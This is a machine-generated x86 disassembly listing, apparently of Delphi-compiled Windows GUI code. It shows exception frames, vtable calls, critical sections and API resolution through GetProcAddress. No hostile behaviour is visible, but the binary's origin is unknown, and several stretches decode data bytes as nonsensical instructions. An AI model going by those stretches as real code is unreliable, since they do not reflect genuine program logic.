mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4057bc
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d140
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4057bc
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d140
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42aec4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429b6c
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42aec4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429b6c
mov ecx r-xdata
call sub_405800
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b07c
lea eax [ ebp - 0xc ]
call sub_4057bc
lea eax [ ebp - 0x8 ]
call sub_4057bc
retn
sub edx 0xfffffff8
sub_42b094
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_429b58
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42b0d4
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_429b58
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42b104
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42b296
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_429b58
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b231
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b29d
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_429b58
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
mov eax esi
xor edx edx
call sub_429b58
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_429b58
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403154
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_429b58
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42b2a4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42b389
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b390
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049cc
lea eax [ ebp - 0x8 ]
call sub_4057bc
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_429b58
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057d4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405800
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_429b58
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057d4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405800
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42b5c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b6b3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403fa4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6ba
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049cc
lea eax [ ebp - 0x10 ]
call sub_4057bc
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405800
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_429b58
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4057d4
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405800
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42b6d8
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b7b7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fa4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b7be
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049cc
lea eax [ ebp - 0x8 ]
call sub_4057bc
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405800
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429b58
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057d4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405800
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42b7d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405830
xor eax eax
push ebp
push sub_42b827
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4057d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b82e
lea eax [ ebx + 0xc ]
call sub_4057bc
sub_42b834
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_42b8c9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403fa4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42b5c0
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8d0
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax ebx
call sub_42b0d4
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42b104
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42b2a4
sub_42b8f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_429b58
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_429b58
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4184a0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_429b58
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4184a0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4184a0
sub_42b980
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_42b094
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403154
mov eax [ esi + 0x14 ]
call sub_403154
mov eax [ esi + 0x10 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4057bc
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_42b9d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ba0b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba12
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42ba1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ba41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba48
retn
sub_42ba54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ba85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba8c
retn
mov eax [ rw-data ]
call sub_403154
sub_42ba98
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42bacc
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42baf4
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
mov eax r-xdata
mov [ rw-data ] eax
sub_42bd76
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bd9d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bda4
retn
sub_42bdb8
add al 0xbe
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 4 ] cl
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
test [ esi - 0x4177ffbe ] bh
outsd
outsb
lea eax [ eax ]
retn
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x68 ] si
mov esi 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ esi + edi * 4 - 0x4177ffbe ] al
inc edx
add [ eax + eax ] bl
add [ eax ] al
mov eax 0x840042bd
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
sub_42be59
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add ah cl
mov esi 0xbefc0042
inc edx
add [ eax ] cl
mov edi 0x54100042
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
mov eax esi
call sub_403144
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
sub_42be8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42becc
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_42bf24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bf49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf50
retn
sub_42bf5c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42bf14
xor eax eax
push ebp
push sub_42c113
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c11a
mov eax [ rw-data ]
call sub_42bf1c
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42c11c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42bf14
xor eax eax
push ebp
push sub_42c4cf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c4d6
mov eax [ rw-data ]
call sub_42bf1c
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42c880
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42c8a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c8f0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c8f7
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403154
call sub_42bf5c
cmp [ rw-data ] 0x0
jg r-xdata
sub_42c918
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c93d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c944
retn
sub_42c950
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c975
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c97c
retn
sub_42c988
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c9ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c9b4
retn
sub_42c9c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c9e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c9ec
retn
sub_42c9f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ca1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
